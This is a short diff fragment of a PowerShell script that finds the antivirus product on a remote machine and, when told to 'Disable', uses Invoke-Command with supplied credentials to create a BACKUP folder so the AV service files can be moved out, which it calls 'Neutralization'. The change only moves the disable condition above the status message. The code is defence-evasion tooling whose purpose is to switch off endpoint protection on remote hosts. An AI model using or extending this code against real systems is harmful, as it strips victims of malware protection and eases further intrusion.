@@ -39,13 +39,13 @@ $AVName = $i | foreach { $_.displayName }
 
 $SvcDirectory = Split-Path -Path $SvcPath
 
+# If Disabling AV, Create Backup Directory
+If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
 if (-not ([string]::IsNullOrEmpty($AVName)))
 {
 Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
 }
 
-# If Disabling AV, Create Backup Directory
-If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
 Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0] | Out-Null} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
 
 # If Disabling AV, Move Service Files to "BACKUP" in Parent Directory
